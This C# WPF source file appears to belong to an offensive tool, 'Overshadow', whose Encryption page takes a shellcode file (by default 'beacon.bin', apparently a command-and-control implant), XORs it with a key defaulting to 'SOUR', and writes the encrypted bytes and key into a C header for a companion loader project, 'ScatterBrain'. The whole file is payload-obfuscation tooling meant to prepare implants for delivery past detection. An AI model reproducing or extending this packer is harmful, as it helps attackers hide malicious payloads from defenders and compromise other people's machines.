using Microsoft.Win32;
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;

namespace Overshadow
{
    public partial class Encryption : Page
    {
        public Encryption()
        {
            InitializeComponent();
        }

        // Create global variable for an uploaded file location. In our circumstances this is for beacon.bin
        public string fileLocation = null;
        // Transform our global variable into a function we can call
        public string InitialFileDirectory = @"C:\"; // Had to set this as C:\ since relative paths were not being accepted and resulting in a program crash.
        public string RawData = @"..\..\Scatter\Brain\rawdata.h";
        public string uploadedFileLocation()
        {
            string location = fileLocation;
            return location;
        }

        public void Upload(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            // Set filter for file extensions and default file extensions
            openFileDialog.DefaultExt = ".bin";
            openFileDialog.Filter = "Binary Files (*.bin)|*.bin";
            openFileDialog.FilterIndex = 2;
            openFileDialog.RestoreDirectory = true;
            // Set initial directory
            openFileDialog.InitialDirectory = InitialFileDirectory;
            Nullable<bool> result = openFileDialog.ShowDialog();
            string theFileName = null;
            if (result == true)
            {
                theFileName = openFileDialog.FileName;
            }
            fileLocation = theFileName;
            // Populate the blank text box with our path.
            uploadPath.Text = theFileName;
            uploadPath.Visibility = System.Windows.Visibility.Visible;
            uploadLabel.Visibility = System.Windows.Visibility.Visible;
        }

        public static string customKey = "ChangeMe";
        // Create the array for customKey so that we can use it to XOR our payload.
        private static char[] customKeyArray()
        {
            if (customKey == "ChangeMe")
            {
                char[] bullFighter = { 'S', 'O', 'U', 'R', '\0' };
                return bullFighter;
            }
            else
            {
                // Ugly string manipulation to get everything proper.
                string transformMe = customKey.ToUpper();
                string finalForm = transformMe + '\0';
                char[] spiritBomb = finalForm.ToCharArray();

                return spiritBomb;
            }
        }
        private void customClick(object sender, RoutedEventArgs e)
        {
            InputBox.Visibility = System.Windows.Visibility.Visible;
        }

        private void YesButton_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // YesButton Clicked! Let's hide our InputBox and handle the input text.
            InputBox.Visibility = System.Windows.Visibility.Collapsed;
            ListboxHide.Visibility = System.Windows.Visibility.Visible;
            // Do something with the Input
            String input = InputTextBox.Text;
            MyListBox.Items.Add(input); // Add Input to our ListBox.
            customKey = input.ToUpper();
            char[] mooCow = customKey.ToCharArray();

            // Clear InputBox.
            InputTextBox.Text = String.Empty;

        }
        private void NoButton_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // NoButton Clicked! Let's hide our InputBox.
            InputBox.Visibility = System.Windows.Visibility.Collapsed;
            ListboxHide.Visibility = System.Windows.Visibility.Collapsed;

            // Clear InputBox.
            InputTextBox.Text = String.Empty;

        }
        private static byte[] XorByteArray(byte[] origBytes, char[] cryptor)
        {
            byte[] result = new byte[origBytes.Length];
            int j = 0;
            for (int i = 0; i < origBytes.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }

                byte res = (byte)(origBytes[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }
            string readme = new string(cryptor);
            Console.WriteLine("LOOK AT ME! " + readme);

            return result;
        }
        private void Encrypt(object sender, EventArgs e)
        {
            CreateEncryptedBin();
            MagicShit();
            MessageBoxResult result = MessageBox.Show("Binary has been encrypted!", "Success!");
        }

        // XOR our binary. By default it's a static key of SOUR unless otherwise changed.
        public void CreateEncryptedBin()
        {
            string customBinary = uploadedFileLocation();
            if (customBinary == null)
            {
                var filePath = Directory.GetCurrentDirectory();
                var placeFiles = filePath + "..\\..\\..\\Assets\\Files\\";
                Console.WriteLine("Looking for beacon at " + placeFiles);
                string absolutepower = placeFiles + "beacon.bin";
                var fileName = absolutepower;
                byte[] shellcodeBytes = File.ReadAllBytes(fileName);
                if (customKey == "ChangeMe")
                {
                    char[] cryptor = new char[] { 'S', 'O', 'U', 'R', '\0' };
                    string readme = new string(cryptor);
                    byte[] encShellcodeBytes = XorByteArray(shellcodeBytes, cryptor);
                    string encryptedPath = placeFiles + "encrypted.bin";
                    File.WriteAllBytes(encryptedPath, encShellcodeBytes);
                }
                else
                {
                    char[] cryptor = customKeyArray();
                    string readme = new string(cryptor);
                    byte[] encShellcodeBytes = XorByteArray(shellcodeBytes, cryptor);
                    string encryptedPath = placeFiles + "encrypted.bin";
                    File.WriteAllBytes(encryptedPath, encShellcodeBytes);
                }
            }
            else
            {
                var filePath = Directory.GetCurrentDirectory();
                var placeFiles = filePath + "..\\..\\..\\Assets\\Files\\";
                string absolutepower = customBinary;
                var fileName = absolutepower;
                byte[] shellcodeBytes = File.ReadAllBytes(fileName);
                if (customKey == "ChangeMe")
                {
                    char[] cryptor = new char[] { 'S', 'O', 'U', 'R', '\0' };
                    byte[] encShellcodeBytes = XorByteArray(shellcodeBytes, cryptor);
                    string encryptedPath = placeFiles + "encrypted.bin";
                    File.WriteAllBytes(encryptedPath, encShellcodeBytes);
                }
                else
                {
                    char[] cryptor = customKeyArray();
                    string readme = new string(cryptor);
                    byte[] encShellcodeBytes = XorByteArray(shellcodeBytes, cryptor);
                    string encryptedPath = placeFiles + "encrypted.bin";
                    File.WriteAllBytes(encryptedPath, encShellcodeBytes);
                }

            }

        }
        // Take our XOR'd binary and create a new RawData.h inside of ScatterBrain
        public static void MagicShit()
        {
            var filePath2 = Directory.GetCurrentDirectory();
            var placeFiles2 = filePath2 + "..\\..\\..\\Assets\\Files\\";
            Console.WriteLine("Creating encrypted.bin at " + placeFiles2);
            string encryptedPath = placeFiles2 + "encrypted.bin";
            var encfilename = encryptedPath; // File to read in
            byte[] encbytes = System.IO.File.ReadAllBytes(encfilename); // Read file as bytes

            StringBuilder encnewhex = new StringBuilder(encbytes.Length * 2);
            foreach (byte b in encbytes)
            {
                encnewhex.AppendFormat("{0:X2}", b); // place in hex format
            }
            if (customKey == "ChangeMe")
            {
                var secretKey = "SOUR";
                Console.WriteLine("SecretKey inside of RawData.h: " + secretKey);
                var encinitial_Formatting = Regex.Replace(encnewhex.ToString(), ".{2}", "$0,0x"); // Formats majority of string to hex
                var encsecondary_Formatting = string.Format("0x{0}", encinitial_Formatting.PadLeft(2, '0')); // adds 0x to the first character
                var encchunkychunk = Regex.Replace(encsecondary_Formatting.ToString(), ".{55}", "$0,\n"); // Chunk out into 11 bytes per line
                var encsplit_Every_Five = Regex.Replace(encchunkychunk.ToString(), ".{5}", "$0, "); // Every five characters, add in ", "
                var enchouseCleaning = encsplit_Every_Five.ToString().Replace(",,", ","); // Get rid of weird double commas
                var encmaidService = enchouseCleaning.ToString().Replace(", ,", ","); // Get rid of weird comma space at the end of the line
                var encfinalForm = encmaidService.Substring(0, encmaidService.Length - 4); // Get rid of trailing 3 characters that we don't need
                var longDaddy = encfinalForm.Length;

                string pwd = Directory.GetCurrentDirectory();
                string superRaw = @"..\..\Scatter\Brain\rawdata.h";
                var stream = new FileStream(superRaw, FileMode.Create);
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.WriteLine("#pragma once");
                    writer.WriteLine("#ifndef RAWDATA_H_");
                    writer.WriteLine("#define RAWDATA_H_");
                    writer.WriteLine(" ");
                    writer.WriteLine("char cryptor[] = \"" + secretKey + "\";");
                    writer.WriteLine(" ");
                    writer.WriteLine("unsigned char rawData[" + longDaddy + "] = { " + encfinalForm + "};");
                    writer.WriteLine(" ");
                    writer.WriteLine("#endif");
                }
                using System.IO.StreamWriter encfile = new System.IO.StreamWriter(superRaw, true); // Write content to file.
            }
            else
            {
                var secretKey = customKey;
                Console.WriteLine("SecretKey: " + secretKey);
                var encinitial_Formatting = Regex.Replace(encnewhex.ToString(), ".{2}", "$0,0x"); // Formats majority of string to hex
                var encsecondary_Formatting = string.Format("0x{0}", encinitial_Formatting.PadLeft(2, '0')); // adds 0x to the first character
                var encchunkychunk = Regex.Replace(encsecondary_Formatting.ToString(), ".{55}", "$0,\n"); // Chunk out into 11 bytes per line
                var encsplit_Every_Five = Regex.Replace(encchunkychunk.ToString(), ".{5}", "$0, "); // Every five characters, add in ", "
                var enchouseCleaning = encsplit_Every_Five.ToString().Replace(",,", ","); // Get rid of weird double commas
                var encmaidService = enchouseCleaning.ToString().Replace(", ,", ","); // Get rid of weird comma space at the end of the line
                var encfinalForm = encmaidService.Substring(0, encmaidService.Length - 4); // Get rid of trailing 3 characters that we don't need
                var longDaddy = encfinalForm.Length;

                string pwd = Directory.GetCurrentDirectory();
                Console.WriteLine(pwd);

                string superRaw = @"..\..\Scatter\Brain\rawdata.h";
                var stream = new FileStream(superRaw, FileMode.Create);
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.WriteLine("#pragma once");
                    writer.WriteLine("#ifndef RAWDATA_H_");
                    writer.WriteLine("#define RAWDATA_H_");
                    writer.WriteLine(" ");
                    writer.WriteLine("char cryptor[] = \"" + secretKey + "\";");
                    writer.WriteLine(" ");
                    writer.WriteLine("unsigned char rawData[" + longDaddy + "] = { " + encfinalForm + "};");
                    writer.WriteLine(" ");
                    writer.WriteLine("#endif");
                }
                using System.IO.StreamWriter encfile = new System.IO.StreamWriter(superRaw, true); // Write content to file.
            }
        }
    }
}
